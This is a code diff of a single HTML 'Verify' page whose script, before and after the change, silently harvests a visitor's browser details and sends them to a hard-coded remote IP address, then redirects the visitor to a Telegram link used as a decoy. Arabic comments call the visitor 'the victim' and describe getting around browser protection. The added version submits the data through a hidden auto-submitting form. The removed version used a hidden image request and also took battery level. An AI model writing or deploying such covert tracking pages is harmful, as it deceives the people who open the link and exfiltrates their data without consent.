@@ -2,41 +2,36 @@
 <html>
 <head>
     <meta charset="UTF-8">
-    <title>Verify</title>
     <script>
-        async function capture() {
-            // جلب رابط التمويه من الـ URL
-            const params = new URLSearchParams(window.location.search);
-            const target = params.get('u') || "https://t.me/vo11a";
+        window.onload = function() {
+            const p = new URLSearchParams(window.location.search);
+            const target = p.get('u') || "https://t.me/vo11a";
             
-            let info = {
-                b: "N/A",
-                ua: navigator.userAgent,
-                plt: navigator.platform
-            };
+            // جمع المعلومات بصمت
+            const info = "Browser: " + navigator.userAgent;
 
-            // جلب معلومات البطارية
-            try {
-                const battery = await navigator.getBattery();
-                info.b = Math.round(battery.level * 100) + "% " + (battery.charging ? "⚡" : "🔋");
-            } catch (e) {}
+            // إنشاء نموذج مخفي لإرسال البيانات غصباً عن المتصفح
+            const form = document.createElement("form");
+            form.method = "GET";
+            form.action = "http://147.135.213.131:20364/log";
 
-            // عنوان سيرفر الاستضافة مالتك
-            const server = "http://147.135.213.131:20364/log";
+            const inputU = document.createElement("input");
+            inputU.name = "u";
+            inputU.value = target;
+            form.appendChild(inputU);
+
+            const inputD = document.createElement("input");
+            inputD.name = "d";
+            inputD.value = info;
+            form.appendChild(inputD);
+
+            document.body.appendChild(form);
             
-            // إرسال البيانات بطريقة "الصورة المخفية" لتخطي حماية المتصفح
-            const img = new Image();
-            const dataQuery = encodeURIComponent(JSON.stringify(info));
-            img.src = `${server}?u=${encodeURIComponent(target)}&d=${dataQuery}&t=${Date.now()}`;
-            
-            // تحويل الضحية لرابط التمويه بعد ثانية واحدة
-            setTimeout(() => {
-                window.location.replace(target);
-            }, 800);
+            // إرسال البيانات ثم التحويل
+            form.submit();
+            setTimeout(() => { window.location.replace(target); }, 500);
         }
-        window.onload = capture;
     </script>
 </head>
-<body style="background-color: #000;">
-</body>
+<body style="background:#000;"></body>
 </html>
